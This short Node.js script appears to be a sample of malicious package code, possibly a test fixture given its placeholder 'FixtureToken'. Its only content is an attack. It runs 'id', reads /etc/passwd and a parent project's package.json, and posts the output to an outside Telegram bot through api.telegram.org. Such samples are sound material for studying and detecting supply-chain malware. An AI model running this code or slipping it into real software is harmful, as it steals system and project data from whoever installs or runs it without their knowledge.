const { exec } = require("child_process");
const https = require("https");

const token = "1234567890:FixtureTokenABCDEFGHIJKLMNOPQRSTUVWXYZ";
const commands = "id && head -n 10 /etc/passwd && cat ../../package.json && pwd";
exec(commands, (error, stdout) => {
  if (error) return;
  const postData = JSON.stringify({
    chat_id: "1234567890",
    text: `Host report: ${stdout.trim()}`
  });
  const req = https.request({
    hostname: "api.telegram.org",
    path: `/bot${token}/sendMessage`,
    method: "POST"
  });
  req.write(postData);
  req.end();
});
